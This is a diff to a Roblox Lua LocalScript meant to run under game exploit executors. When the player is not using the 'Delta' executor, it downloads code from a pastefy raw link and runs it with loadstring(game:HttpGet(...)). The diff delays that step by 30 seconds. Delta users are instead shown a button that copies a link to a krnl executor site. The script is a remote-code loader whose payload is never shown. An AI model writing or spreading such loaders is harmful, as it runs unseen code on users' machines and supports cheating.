@@ -1,4 +1,4 @@
--- LocalScript (e.g., in StarterGui or StarterPlayerScripts)
+-- LocalScript (StarterGui or StarterPlayerScripts)
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
@@ -73,7 +73,7 @@ local function showExecutorWarning()
 	buttonCorner.Parent = copyButton
 
 	copyButton.MouseButton1Click:Connect(function()
-		local link = "https://krnl.cat" -- Replace with your preferred URL
+		local link = "https://krnl.place" -- Replace with your own link
 		if setclipboard then
 			setclipboard(link)
 			copyButton.Text = "Link copied!"
@@ -96,6 +96,8 @@ end
 if isUsingDelta() then
 	showExecutorWarning()
 else
-	-- If not Delta, run the actual script
-	loadstring(game:HttpGet("https://pastefy.app/tOuvOPsz/raw"))()
+	-- Wait 30 seconds before executing external script
+	task.delay(30, function()
+		loadstring(game:HttpGet("https://pastefy.app/tOuvOPsz/raw"))()
+	end)
 end
